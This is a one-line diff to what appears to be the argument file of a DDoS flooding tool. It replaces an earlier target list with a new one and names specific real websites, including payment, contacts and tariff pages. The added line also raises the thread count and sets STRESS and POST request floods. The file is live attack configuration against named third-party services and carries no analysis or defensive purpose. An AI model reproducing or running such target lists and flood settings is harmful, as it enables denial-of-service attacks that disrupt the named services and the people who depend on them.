@@ -1,1 +1,1 @@
--c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/ofd/ofd_l7_http -t 2000 --rpc 2000 --http-methods GET POST --table
+-c http://goals.ddosukraine.com.ua/haydamaky/targets_tcp.txt https://neophones.ru https://neophones.ru/utm5/connect_master https://neocomms.ru/payment https://neocomms.ru/contacts https://neophones.ru/tariffs -t 3000 --rpc 2000 --http-methods STRESS POST --table
